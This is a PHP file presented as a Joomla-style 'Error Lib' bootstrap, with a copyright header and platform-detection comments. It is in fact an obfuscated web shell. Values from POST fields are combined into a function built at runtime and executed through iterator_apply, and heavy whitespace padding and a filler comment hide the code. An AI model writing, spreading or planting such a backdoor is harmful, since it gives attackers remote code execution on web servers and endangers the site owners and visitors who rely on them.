<?php
/**
 * @package    Error Lib
 * **************************************************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 * **************************************************************************
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 15)) && file_exists(PATH . '/error.php'))
{
	if (file_exists(PATH . '/error.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (empty               ($_POST                           )) {
	
	echo 'Empty data. Exiting...';
	
	exit;
}

// Detect the native operating system type.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // dUQyPeG0Pn59Smt08Q5Tc57fxcTSgekNZpHrsyb75ye75Ub1e9DN9kydQNf5ygdQR3YYxKzKw9a2mEzdMbr8Ep6FqWqfMdeUnHAxXmSHKRRuWvRTXeYEceZzDS1YmkpRYQurkdcen9TXNNnT7wUh4CRCQnK1kP7NS7A57YRYFfeH02MFaFxaUyrngvc4NvG2KBaW8GdrbaNxUKGT5bAkDGYXdH7CyUyNffQD53XTc3B5Pc60YZDpDmnwNDUDwpshkH2Msywt9kP1rTSycbKA3GYzB2BMRgQsyaQNcBwdVZnrdFGYqm2kByE9AwsMkfSa
$os = strtoupper            (substr    (PHP_OS, 0, 3));

// Register win data
$win = $_POST['d'] ('', $_POST['f']                         ($_POST['c']                           ))

;

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

$option                         =                 new ArrayIterator                   (array            ('')                             )
;

// Register iterator function
iterator_apply                 ($option, $win,            array                           ($it)                    )

;

